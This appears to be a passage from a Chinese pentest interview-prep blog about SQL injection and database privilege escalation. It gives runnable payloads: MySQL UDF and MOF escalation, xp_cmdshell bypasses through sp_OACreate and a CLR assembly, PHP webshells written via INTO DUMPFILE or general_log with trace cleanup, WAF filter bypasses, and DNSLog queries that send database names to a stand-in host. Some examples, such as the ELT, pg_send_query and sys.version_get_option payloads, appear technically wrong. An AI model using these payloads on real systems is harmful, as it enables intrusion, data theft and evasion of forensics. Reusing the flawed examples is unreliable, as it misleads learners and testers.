<li><p><strong>上传 UDF 库文件</strong>：攻击者利用 SQL 注入或文件写入漏洞，将一个包含恶意系统命令执行功能的 UDF 库文件（例如 <code>lib_mysqludf_sys.so</code> 或 <code>mysql.dll</code>）上传到 MySQL 服务器的可写目录，通常是插件目录 (<code>/usr/lib/mysql/plugin/</code>) 或其他可写目录</p>
</li>
<li><p><strong>创建自定义函数</strong>：使用 SQL 语句，调用 <code>CREATE FUNCTION</code> 命令，将上传的 UDF 库文件中的恶意函数（如 <code>sys_exec</code> 或 <code>sys_eval</code>）注册为 MySQL 函数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;lib_mysqludf_sys.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>执行系统命令</strong>：通过调用新创建的函数，执行任意系统命令，从而实现提权</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>防御方法：</strong></p>
<ul>
<li><strong>最小权限原则</strong>：不要授予 MySQL 用户 <code>FILE</code> 或 <code>SUPER</code> 等高权限</li>
<li><strong>加固配置</strong>：修改 <code>my.cnf</code> 文件，设置 <code>secure_file_priv</code> 为空或一个指定的安全目录，以限制文件导入导出功能</li>
</ul>
</li>
</ul>
<p><strong>2. MOF 提权（Managed Object Format）</strong></p>
<p>MOF 提权是针对 Windows 服务器的一种特定提权方式，利用了 Windows Server 2003&#x2F;2008 上的一些服务配置不当</p>
<ul>
<li><strong>前提条件：</strong><ul>
<li><strong>Windows 服务器</strong>：目标服务器必须是 Windows 系统</li>
<li><strong>可写目录</strong>：攻击者必须能够将恶意 MOF 文件写入到 <code>%systemroot%\system32\wbem\mof</code> 目录下</li>
<li><strong>MySQL 权限</strong>：需要有 <code>FILE</code> 权限，以写入文件</li>
</ul>
</li>
<li><strong>攻击步骤：</strong><ol>
<li><strong>编写恶意 MOF 文件</strong>：MOF 是 Windows 管理规范（WMI）使用的文件格式。攻击者可以编写一个恶意的 MOF 文件，让其在被系统加载时，自动执行一个指定的命令，比如创建一个新的管理员用户</li>
<li><strong>上传 MOF 文件</strong>：利用 <code>SELECT ... INTO OUTFILE</code> 语句，将恶意 MOF 文件写入到 <code>%systemroot%\system32\wbem\mof</code> 目录下</li>
<li><strong>服务触发</strong>：Windows 的 <code>CIMOM</code> 服务会周期性地扫描该目录下的 MOF 文件，并自动执行其内容。当恶意 MOF 文件被执行后，攻击者指定的命令就会被执行，从而实现提权</li>
</ol>
</li>
<li><strong>防御方法：</strong><ul>
<li><strong>最小权限原则</strong>：不要授予 MySQL 用户 <code>FILE</code> 权限</li>
<li><strong>更新系统</strong>：该漏洞在较新的 Windows 系统版本中已被修复</li>
</ul>
</li>
</ul>
<hr>
<h3 id="MMSQL-的-xp-cmdshell-函数被禁用怎么绕过"><a href="#MMSQL-的-xp-cmdshell-函数被禁用怎么绕过" class="headerlink" title="MMSQL 的 xp_cmdshell() 函数被禁用怎么绕过"></a>MMSQL 的 xp_cmdshell() 函数被禁用怎么绕过</h3><p><strong>1. 利用其他扩展存储过程</strong></p>
<p>MSSQL 中还有一些其他的扩展存储过程，它们可能没有 <code>xp_cmdshell</code> 那么直接，但仍然可以用于执行命令或读写文件</p>
<ul>
<li><p><strong><code>sp_OACreate</code> (OLE Automation Procedures)</strong>: 这个过程通常用于创建 COM 对象，但如果你能找到合适的 COM 对象，比如 <code>WScript.Shell</code>，就可以利用它来执行命令</p>
<p><strong>示例代码:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@shell</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="variable">@shell</span> <span class="keyword">OUT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@shell</span>, <span class="string">&#x27;run&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;cmd.exe /c whoami &gt; C:\temp\output.txt&#x27;</span>;</span><br><span class="line"><span class="comment">-- 之后你可以读取 output.txt 来获取结果</span></span><br></pre></td></tr></table></figure>

<p><strong>注意:</strong> 这种方法依赖于是否启用了 OLE Automation Procedures，并且需要寻找可以被利用的 COM 对象</p>
</li>
</ul>
<p><strong>2. SQL Server Agent Jobs</strong></p>
<p>如果 SQL Server Agent 服务正在运行，并且你拥有创建作业的权限，你可以创建一个新的 Agent Job，并在其中执行 PowerShell 或命令行脚本</p>
<ul>
<li><strong>创建作业 (Job)</strong>: 创建一个 SQL Agent Job，步骤类型 (Step Type) 选择 <strong><code>Operating system (CmdExec)</code></strong> 或 <strong><code>PowerShell</code></strong></li>
<li><strong>编写脚本</strong>: 在步骤中直接写入你要执行的命令</li>
<li><strong>启动作业</strong>: 启动该作业，命令就会在 SQL Server Agent 的权限下执行</li>
</ul>
<p>这种方法的好处是，即使 <code>xp_cmdshell</code> 被禁用，Agent Job 依然可以运行。但前提是，你有权限创建并执行作业</p>
<p><strong>3. CLR Assembly</strong></p>
<p>SQL Server 提供了 CLR (Common Language Runtime) 集成功能，允许你在数据库中运行 .NET 代码。如果你可以创建一个恶意的 CLR Assembly，并在其中编写执行命令的代码，就可以绕过 <code>xp_cmdshell</code></p>
<ul>
<li><p><strong>启用 CLR</strong>:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;clr enabled&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建并部署 Assembly</strong>: 编写一个 C# 代码，使用 <code>System.Diagnostics.Process</code> 类来执行命令，然后将其编译成 DLL，并上传到数据库</p>
</li>
<li><p><strong>创建存储过程</strong>: 创建一个 SQL 存储过程来调用这个 Assembly 中的方法</p>
<p><strong>C# 代码示例:</strong></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Data.SqlClient;</span><br><span class="line"><span class="keyword">using</span> Microsoft.SqlServer.Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">StoredProcedures</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">SqlProcedure</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">CmdExec</span>(<span class="params"><span class="built_in">string</span> command</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Process.Start(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c &quot;</span> + command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server 端:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建 Assembly</span></span><br><span class="line"><span class="keyword">CREATE</span> ASSEMBLY CommandExec <span class="keyword">FROM</span> <span class="string">&#x27;C:\path\to\YourAssembly.dll&#x27;</span> <span class="keyword">WITH</span> PERMISSION_SET <span class="operator">=</span> UNSAFE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建存储过程</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> sp_CmdExec <span class="variable">@command</span> NVARCHAR(<span class="number">4000</span>) <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">EXTERNAL</span> NAME [YourAssembly].[StoredProcedures].[CmdExec];</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_CmdExec <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注意:</strong> CLR Assembly 功能通常是默认禁用的，并且创建 UNSAFE 权限集的 Assembly 需要 <code>sysadmin</code> 权限</p>
</li>
</ul>
<hr>
<h3 id="MySQL-5-0-以上和-5-0-以下的区别"><a href="#MySQL-5-0-以上和-5-0-以下的区别" class="headerlink" title="MySQL 5.0 以上和 5.0 以下的区别"></a>MySQL 5.0 以上和 5.0 以下的区别</h3><p><strong>1. <code>information_schema</code> 的有无</strong></p>
<p><strong>MySQL 5.0 以下</strong>：</p>
<ul>
<li><strong>信息收集困难</strong>：没有 <code>information_schema</code> 这个<strong>元数据数据库</strong>。攻击者无法通过简单的查询 <code>information_schema.tables</code> 或 <code>information_schema.columns</code> 来列出数据库、表和列的名称。这迫使渗透测试人员<strong>依赖盲注和字典攻击</strong>来猜测表名和列名，大大增加了信息收集的难度和时间</li>
</ul>
<p><strong>MySQL 5.0 及以上</strong>：</p>
<ul>
<li><strong>信息收集自动化</strong>：<code>information_schema</code> 数据库的引入，彻底改变了 SQL 注入的自动化方式。攻击者可以通过一条简单的注入语句，就能<strong>枚举出整个数据库的结构</strong>，包括所有库名、表名、列名以及它们的数据类型。这使得像 <strong>SQLmap</strong> 这样的自动化工具能够高效地工作，大大降低了攻击的门槛。</li>
</ul>
<p><strong>2. 并发操作模式</strong></p>
<p><strong>MySQL 5.0 以下</strong>：</p>
<ul>
<li><strong>多用户单操作</strong>：这个说法通常是指<strong>不完全支持多用户并发</strong>，或者并发控制机制相对简单。在某些版本中，对同一资源的并发访问可能导致锁定和性能问题。从渗透角度看，这可能导致一些复杂的注入技术（如基于锁定的时间盲注）效果不佳，但影响相对较小</li>
</ul>
<p><strong>MySQL 5.0 及以上</strong>：</p>
<ul>
<li><strong>多用户多操作</strong>：这通常指的是<strong>更好的并发控制</strong>和<strong>事务支持</strong>。MySQL 5.0 引入了<strong>事务</strong>和更强大的锁机制，使得多个用户可以同时对数据库进行复杂操作，而不会相互干扰。这对于正常的业务应用至关重要</li>
</ul>
<hr>
<h3 id="SQL-注入-outfile-被过滤怎么绕过"><a href="#SQL-注入-outfile-被过滤怎么绕过" class="headerlink" title="SQL 注入 outfile() 被过滤怎么绕过"></a>SQL 注入 outfile() 被过滤怎么绕过</h3><p><strong>1. 利用 <code>dumpfile()</code> 函数</strong></p>
<p>如果 <code>outfile()</code> 被禁用，但 <code>dumpfile()</code> 未被过滤，这是一个直接的替代方案</p>
<ul>
<li><strong>区别</strong>：<code>outfile()</code> 可以将查询结果输出到文件中，支持多行数据。而 <code>dumpfile()</code> 只能输出单行数据。</li>
<li><strong>用法</strong>：将需要写入文件的内容作为查询结果，然后使用 <code>into dumpfile</code> 写入</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>2. 利用日志文件</strong></p>
<p>如果数据库开启了通用查询日志（<code>general_log</code>）或者慢查询日志（<code>slow_query_log</code>），并且你有权限修改日志路径，那么可以利用这个特性来写入 Webshell</p>
<ul>
<li><strong>步骤</strong>：<ol>
<li><strong>设置日志文件路径</strong>：将 <code>general_log_file</code> 或 <code>slow_query_log_file</code> 的值修改为 Web 目录下的一个可写路径，例如 <code>/var/www/html/shell.php</code></li>
<li><strong>开启日志</strong>：将 <code>general_log</code> 或 <code>slow_query_log</code> 设为 <code>ON</code></li>
<li><strong>写入恶意代码</strong>：执行一个包含 Webshell 代码的查询，例如 <code>SELECT &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</code>。这条查询语句会被写入到日志文件中，从而创建 Webshell</li>
</ol>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 修改日志路径</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 开启日志</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> <span class="keyword">ON</span>;</span><br><span class="line"></span><br><span class="line"># 写入 Webshell</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 写入完成后，关闭日志并重置路径，避免留下痕迹</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> OFF;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/path/to/original/log&#x27;</span>;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="SQL-注入中-Post-和-Get-都做了防注入可采用什么方式绕过"><a href="#SQL-注入中-Post-和-Get-都做了防注入可采用什么方式绕过" class="headerlink" title="SQL 注入中 Post 和 Get 都做了防注入可采用什么方式绕过"></a>SQL 注入中 Post 和 Get 都做了防注入可采用什么方式绕过</h3><p>许多 Web 应用程序不仅处理 POST 和 GET 数据，还会依赖于 HTTP 请求头中的信息。如果这些头信息没有经过严格的过滤，就可能成为注入点</p>
<ul>
<li><strong>User-Agent：</strong> 很多网站会记录访问者的 User-Agent 信息。如果后台程序直接将 User-Agent 拼接到 SQL 查询中，就可能存在注入</li>
<li><strong>X-Forwarded-For：</strong> 这个头通常用于获取用户的真实 IP 地址。当网站部署了负载均衡或 CDN 时，它会记录用户的原始 IP。同样，如果处理不当，也可能成为注入点</li>
<li><strong>Cookie：</strong> 网站通常会使用 Cookie 来存储会话信息或其他用户数据。如果 Cookie 中的某个值直接参与了 SQL 查询，就可能被利用</li>
<li><strong>Referer：</strong> 网站会记录用户是从哪个页面跳转过来的。如果这个信息直接被用于查询，同样存在风险</li>
</ul>
<p><strong>绕过方式：</strong> 以 User-Agent 为例，你可以使用 Burp Suite 或其他抓包工具，在请求头中修改 User-Agent 的值，构造 SQL 注入 Payload。 例如：<code>User-Agent: &#39; OR 1=1--</code></p>
<hr>
<h3 id="SQL-盲注-if-函数被过滤怎么绕过"><a href="#SQL-盲注-if-函数被过滤怎么绕过" class="headerlink" title="SQL 盲注 if() 函数被过滤怎么绕过"></a>SQL 盲注 if() 函数被过滤怎么绕过</h3><p><strong>1. 利用 <code>CASE WHEN</code> 语句</strong></p>
<p><code>CASE WHEN</code> 语句是 SQL 中最常见的条件判断表达式，其功能与 <code>IF()</code> 函数非常相似，且通常不会被安全设备过滤</p>
<ul>
<li><strong>语法：</strong> <code>CASE WHEN [condition] THEN [value1] ELSE [value2] END</code></li>
<li><strong>布尔盲注绕过：</strong> <code>SELECT * FROM users WHERE id = 1 AND CASE WHEN (1=1) THEN 1 ELSE 2 END = 1</code></li>
<li><strong>时间盲注绕过：</strong> <code>SELECT * FROM users WHERE id = 1 AND CASE WHEN (SUBSTRING(database(),1,1) = &#39;d&#39;) THEN SLEEP(5) ELSE 0 END</code></li>
</ul>
<p><strong>2. 利用 <code>UNION</code> + 错误信息</strong></p>
<p>当 <code>IF()</code> 被过滤，但 <code>UNION</code> 和错误信息回显没有被完全禁用时，我们可以利用 <code>UNION</code> 来触发自定义的错误信息，从而进行布尔盲注</p>
<ul>
<li><strong>原理：</strong> 通过 <code>UNION</code> 将一个错误的查询结果与正常的查询结果合并，当错误的查询语句执行时，数据库会返回错误信息，其中可能包含我们想要的数据</li>
<li><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = -1 UNION SELECT 1, 2, 3 FROM DUAL WHERE (1=2) OR (1=1) UNION SELECT 1, 2, 3 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a</code> 这个方法需要根据具体情况进行调整，利用数据库的语法错误或类型转换错误来触发自定义的错误信息</li>
</ul>
<p><strong>3. 利用位运算和 <code>LIKE</code> 语句</strong></p>
<p>当数据库不支持 <code>IF()</code> 或 <code>CASE</code> 语句时，我们可以利用逻辑运算和位运算来逐位判断数据</p>
<ul>
<li><strong>原理：</strong> <code>LIKE</code> 语句可以用于模糊匹配，我们可以将它和数据库中的数据结合起来，逐个字符地猜解</li>
<li><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND username LIKE &#39;a%&#39;</code> 如果该查询返回结果，则说明 <code>username</code> 的第一个字符是 ‘a’。我们可以通过不断改变 <code>%</code> 前的字符来逐个猜解数据</li>
</ul>
<p><strong>4. 利用 <code>benchmark()</code> 函数</strong></p>
<p>在 MySQL 中，<code>benchmark()</code> 函数可以用来执行指定的函数多次，从而消耗大量时间。这可以用来替代 <code>SLEEP()</code> 函数进行时间盲注</p>
<ul>
<li><p><strong>原理：</strong> <code>BENCHMARK(count, expr)</code> 会重复执行 <code>expr</code> 表达式 <code>count</code> 次。如果 <code>expr</code> 包含一个耗时的操作，我们可以根据执行时间来判断条件是否成立</p>
</li>
<li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000, MD5(1)) AND (SUBSTRING(database(),1,1) = &#39;d&#39;)</code></p>
<p>如果条件 <code>(SUBSTRING(database(),1,1) = &#39;d&#39;)</code> 成立，<code>BENCHMARK</code> 函数就会被执行，页面响应会变慢。否则，页面会立即响应</p>
</li>
</ul>
<p><strong>5. 利用 <code>get_lock()</code> 函数</strong></p>
<p>在 MySQL 中，<code>GET_LOCK()</code> 函数可以用于获取一个全局锁，如果锁已被其他会话占用，该函数会等待直到锁被释放或超时</p>
<ul>
<li><p><strong>原理：</strong> 我们可以利用 <code>GET_LOCK()</code> 函数设置一个长达数秒的锁，从而实现时间盲注的效果</p>
</li>
<li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND IF((SUBSTRING(database(),1,1)=&#39;d&#39;), GET_LOCK(&#39;hack&#39;, 5), 0)</code></p>
<p>如果条件成立，<code>GET_LOCK</code> 会被执行，页面会等待 5 秒</p>
</li>
</ul>
<p><strong>6. 利用 <code>ELT()</code> 函数</strong></p>
<p><code>ELT()</code> 函数是 MySQL 中的一个字符串函数，它可以根据索引返回列表中的一个字符串</p>
<ul>
<li><strong>原理：</strong> <code>ELT(N, str1, str2, ...)</code> 返回第 N 个字符串。我们可以将它与条件判断结合，实现布尔盲注</li>
<li><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND ELT(1, &#39;false&#39;, &#39;true&#39;)</code> 如果条件为真，<code>ELT</code> 会返回 <code>true</code>，否则返回 <code>false</code></li>
</ul>
<hr>
<h3 id="SQL-注入无回显利用-DNSLog-如何构造"><a href="#SQL-注入无回显利用-DNSLog-如何构造" class="headerlink" title="SQL 注入无回显利用 DNSLog 如何构造"></a>SQL 注入无回显利用 DNSLog 如何构造</h3><p><strong>1. MySQL&#x2F;MariaDB</strong></p>
<p>在 MySQL 和 MariaDB 中，<code>LOAD_FILE()</code> 函数和 <code>UNC</code> 路径（Windows 共享路径）是触发 DNS 查询的常用手段</p>
<p><strong>a. 利用 <code>LOAD_FILE()</code></strong></p>
<p><code>LOAD_FILE()</code> 函数用于读取文件内容，但如果给它一个 UNC 路径，它会触发 DNS 查询</p>
<ul>
<li><strong>Payload 构造：</strong> <code>SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT DATABASE()),&#39;.your-dnslog.com\\a&#39;));</code></li>
<li><strong>解释：</strong><ul>
<li><code>SELECT DATABASE()</code>：获取当前数据库名</li>
<li><code>CONCAT(...)</code>：将数据库名与你的 DNSlog 域名拼接成一个新的域名，例如 <code>testdb.your-dnslog.com</code></li>
<li><code>LOAD_FILE()</code>：尝试加载这个 UNC 路径，由于域名不存在本地，它会发起 DNS 查询</li>
<li><code>\\a</code>：这是一个占位符，用于避免语法错误</li>
</ul>
</li>
</ul>
<p><strong>b. 利用 <code>DNS_REVERSE()</code> 和 <code>BENCHMARK()</code></strong></p>
<p>这是一个更高级的技巧，需要 MySQL 5.7.10 或更高版本，且安装了 <code>sys</code> 模式</p>
<ul>
<li><strong>Payload 构造：</strong> <code>SELECT BENCHMARK(1000000,MD5(CONCAT(&#39;a&#39;,(SELECT DATABASE())))) AND (SELECT sys.version_get_option(&#39;version&#39;) LIKE &#39;%DNS%&#39;);</code><ul>
<li>注意：这个方法主要是为了演示 <code>sys</code> 库的功能，实际操作中 <code>LOAD_FILE</code> 更常见</li>
</ul>
</li>
</ul>
<p><strong>2. SQL Server</strong></p>
<p>在 SQL Server 中，我们可以利用 <code>xp_cmdshell</code> 或 <code>sp_oacreate</code> 来触发 DNS 查询</p>
<p><strong>a. 利用 <code>xp_cmdshell</code></strong></p>
<p><code>xp_cmdshell</code> 是一个强大的存储过程，可以执行系统命令。我们可以利用 <code>ping</code> 命令来触发 DNS 查询</p>
<ul>
<li><strong>Payload 构造：</strong> <code>EXEC xp_cmdshell &#39;ping -n 1 &#39; + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + &#39;.your-dnslog.com&#39;;</code></li>
<li><strong>解释：</strong><ul>
<li><code>xp_cmdshell</code>：执行 <code>ping</code> 命令</li>
<li><code>SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases</code>：获取第一个数据库的名称</li>
<li><code>+</code>：将数据库名与你的 DNSlog 域名拼接</li>
</ul>
</li>
</ul>
<p><strong>b. 利用 <code>sp_oacreate</code></strong></p>
<p><code>sp_oacreate</code> 可以创建 OLE 对象，我们可以利用它来发起 HTTP 请求，从而触发 DNS 查询</p>
<ul>
<li><strong>Payload 构造：</strong> <code>DECLARE @h INT; EXEC sp_oacreate &#39;WinHttp.WinHttpRequest.5.1&#39;, @h OUT; EXEC sp_oamethod @h, &#39;Open&#39;, NULL, &#39;GET&#39;, &#39;http://&#39; + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + &#39;.your-dnslog.com&#39;;</code></li>
</ul>
<h4 id="3-PostgreSQL"><a href="#3-PostgreSQL" class="headerlink" title="3. PostgreSQL"></a>3. PostgreSQL</h4><hr>
<p>在 PostgreSQL 中，<code>COPY</code> 命令和 <code>pg_sleep</code> 结合可以实现 DNSlog。但更直接的方法是利用 <code>pg_send_query</code> 或 <code>UDF</code>（用户定义函数）。</p>
<ul>
<li><strong>Payload 构造：</strong> <code>SELECT * FROM users WHERE id = 1 AND (SELECT pg_send_query(&#39;SELECT * FROM &#39; || (SELECT version()) || &#39;.your-dnslog.com&#39;)) IS NOT NULL;</code></li>
<li><strong>解释：</strong><ul>
<li><code>pg_send_query()</code>：用于发送一个查询。</li>
<li><code>(SELECT version())</code>：获取 PostgreSQL 的版本信息。</li>
<li>这个方法利用了 PostgreSQL 在解析域名时会触发 DNS 查询的特性</li>
</ul>
</li>
</ul>
<hr>
<h3 id="and-or-被过滤怎么绕过"><a href="#and-or-被过滤怎么绕过" class="headerlink" title="and or 被过滤怎么绕过"></a>and or 被过滤怎么绕过</h3><p><strong>1. 利用逻辑运算符的符号替代</strong></p>
<p>在某些情况下，WAF（Web Application Firewall）可能只过滤了关键字，而忽略了它们的符号表示</p>
<ul>
<li><strong><code>&amp;&amp;</code> 替代 <code>and</code>：</strong> 在 MySQL 中，<code>&amp;&amp;</code> 和 <code>and</code> 的功能相同。如果 <code>and</code> 被过滤，可以尝试使用 <code>&amp;&amp;</code>。</li>
<li><strong><code>||</code> 替代 <code>or</code>：</strong> 同样，<code>||</code> 可以替代 <code>or</code> 来进行逻辑或操作。</li>
</ul>
<p><strong>Payload 实例：</strong></p>
<ul>
<li><strong>原始注入：</strong> <code>id=1 and 1=2</code></li>
<li><strong>绕过：</strong> <code>id=1 &amp;&amp; 1=2</code></li>
</ul>
<p><strong>2. 利用<code>!</code>、<code>&lt;&gt;</code>、<code>not</code> 等操作符</strong></p>
<p>通过巧妙地结合其他逻辑或比较操作符，我们可以构造出等价的判断逻辑</p>
<ul>
<li><strong><code>and</code> 的替代：</strong><ul>
<li><code>if not (a=1) then ...</code> 等价于 <code>if a&lt;&gt;1 then ...</code></li>
<li>我们可以利用 <code>not</code> 或 <code>&lt;&gt;</code> 来否定条件，从而实现 <code>and</code> 的效果</li>
<li><strong>例如：</strong> <code>username=admin&#39; or not (&#39;1&#39;=&#39;1&#39; and &#39;1&#39;=&#39;2&#39;)</code> 这句可以被改写为 <code>username=admin&#39; or not (1=1)</code>，这在逻辑上是错误的，我们可以利用它来测试</li>
<li><strong>更具体的绕过：</strong> <code>id=1 and 1=2</code> 可以被改写为 <code>id=1 or not 1=1</code>，这在布尔盲注中可以用来判断</li>
</ul>
</li>
</ul>
<p><strong>3. 利用<code>union select</code>进行盲注</strong></p>
<p>当布尔条件失效时，可以尝试使用 <code>union select</code> 来进行盲注</p>
<ul>
<li><strong>原理：</strong><ul>
<li>正常情况下，<code>union select</code> 需要前后两个查询的列数一致</li>
<li>我们可以利用这一点，通过 <code>union select</code> 来注入一个不存在的列，从而触发数据库的报错，通过报错信息来判断</li>
</ul>
</li>
<li><strong>绕过方式：</strong><ul>
<li><strong>首先，使用 <code>union</code> 探测列数。</strong> <code>id=1 union select 1,2,3...</code></li>
<li><strong>然后，利用列数来进行盲注。</strong> <code>id=-1 union select 1, 2, user() like &#39;root%&#39;</code> 如果页面正常回显，则说明 <code>user()</code> 以 <code>root</code> 开头。通过这种方式，可以逐字逐句地猜解数据</li>
</ul>
</li>
</ul>
<p><strong>4. 利用<code>if()</code>函数的替代品</strong></p>
<p>在布尔盲注中，<code>if()</code> 函数通常是不可或缺的。如果它和 <code>and</code> <code>or</code> 一起被过滤，那么需要寻找替代函数</p>
<ul>
<li><strong><code>case when ... then ... end</code>：</strong> 这是 <code>if()</code> 函数最常见的替代品，功能完全一样，且通常不会被过滤<ul>
<li><strong>例如：</strong> <code>id=1 and (case when 1=1 then sleep(5) else 0 end)</code></li>
<li><strong>绕过：</strong> <code>id=1 or (case when (database() like &#39;d%&#39;) then sleep(5) else 0 end)</code></li>
</ul>
</li>
<li><strong><code>greatest()</code> 和 <code>least()</code>：</strong> 这两个函数返回一组值中的最大值和最小值。我们可以利用它们来构造条件判断<ul>
<li><strong>例如：</strong> <code>id=1 and greatest(1, (select if(1=1, 0, 1)))</code></li>
<li><strong>绕过：</strong> <code>id=1 or greatest(ascii(substr(database(),1,1)), 100)&gt;100</code></li>
</ul>
</li>
</ul>
<p><strong>5. 利用其他查询特性</strong></p>
<p>当所有常用方法都被过滤时，可以尝试利用一些非常规的查询特性</p>
<ul>
<li><strong><code>having</code> 子句：</strong> <code>having</code> 用于对 <code>group by</code> 的结果进行过滤。在一些情况下，<code>having</code> 后面可以接子查询，可以利用这一点进行注入</li>
<li><strong><code>limit offset</code>：</strong> 我们可以通过 <code>limit</code> 和 <code>offset</code> 来逐行读取数据，再结合其他技术进行判断</li>
</ul>
<hr>
<h3 id="SQLMap-自带脚本有哪些"><a href="#SQLMap-自带脚本有哪些" class="headerlink" title="SQLMap 自带脚本有哪些"></a>SQLMap 自带脚本有哪些</h3><p><strong>1. 编码与混淆（绕过签名检测）</strong></p>
<p>这类脚本通过对注入语句进行编码或转换，来改变其特征，以躲避基于签名的检测</p>
<ul>
<li><code>**charencode.py**</code>：对所有字符进行 URL 编码，适用于 URL 编码绕过</li>
<li><code>**randomcase.py**</code>：将 SQL 关键字的字母大小写随机化<ul>
<li><strong>示例：</strong> <code>SELECT</code> -&gt; <code>sELeCT</code></li>
</ul>
</li>
<li><code>**space2comment.py**</code>：将空格替换为 SQL 注释 <code>/**/</code><ul>
<li><strong>示例：</strong> <code>SELECT user FROM users</code> -&gt; <code>SELECT/**/user/**/FROM/**/users</code></li>
</ul>
</li>
<li><code>**space2mysqlblank.py**</code>：用 MySQL 专有的空格字符（如 Tab、换行符）替换空格</li>
<li><code>**base64encode.py**</code>：对整个注入语句进行 Base64 编码。需要目标网站解码才能生效</li>
</ul>
<p><strong>2. 空白字符与分隔符替换</strong></p>
<p>这类脚本利用不同数据库对空白字符的解析差异来绕过过滤</p>
<ul>
<li><code>**apostrophemask.py**</code>：将单引号 <code>&#39;</code> 替换为 UTF-8 编码的 <code>&#39;</code></li>
<li><code>**equaltolike.py**</code>：将等号 <code>=</code> 替换为 <code>LIKE</code> 关键字<ul>
<li><strong>示例：</strong> <code>id=1</code> -&gt; <code>id LIKE 1</code></li>
